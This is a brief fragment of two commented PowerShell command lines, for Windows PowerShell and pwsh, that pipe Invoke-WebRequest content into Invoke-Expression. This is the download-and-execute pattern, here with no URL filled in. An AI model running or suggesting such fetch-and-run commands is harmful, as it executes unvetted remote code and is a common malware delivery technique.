...
# powershell.exe -command "Invoke-expression (invoke-webrequest -usebasicparsing).content"
# pwsh.exe -command "Invoke-expression (invoke-webrequest -usebasicparsing).content"
